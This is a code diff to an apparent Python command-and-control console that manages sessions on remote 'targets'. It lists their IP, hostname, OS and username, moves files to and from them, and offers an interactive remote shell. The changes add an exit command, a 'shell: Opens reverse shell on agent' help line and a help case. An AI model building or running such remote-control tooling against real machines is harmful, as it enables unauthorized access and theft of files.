@@ -30,6 +30,8 @@ def shell(session):
         ans = conn.recv(1024).decode()
         sys.stdout.write(ans)
         command = input()
+        if command == 'exit':
+            break
 
         #Send command
         command += "\n"
@@ -38,6 +40,7 @@ def shell(session):
 
         #Remove the output of the "input()" function
         sys.stdout.write("\033[A" + ans.split("\n")[-1])
+
 
 def list():
     table = PrettyTable(["ID", "IP", "port", 'Hostname', 'OS', 'Username'])
@@ -57,6 +60,7 @@ def session_help():
     print("""
     download    Usage: 'download <from(target's path)> <where(your path)>'
     upload      Usage:  'upload <where(your path)> <from(target's path)>'
+    shell       Opens reverse shell on agent      
     exit        exiting from current session
     help        shows this page
     """)
@@ -68,7 +72,7 @@ def help():
     use     Usage: 'use <number of session>' interracting with specific target    
     help    shows this page    
 
-""")
+    """)
 
 
 def use(session):
@@ -90,6 +94,8 @@ def use(session):
                     upload(what=command[1], where=command[2], session=session)
                 case 'shell':
                     shell(session=session)
+                case 'help':
+                    session_help()
                 
     else:
         print("ID does not exist!")
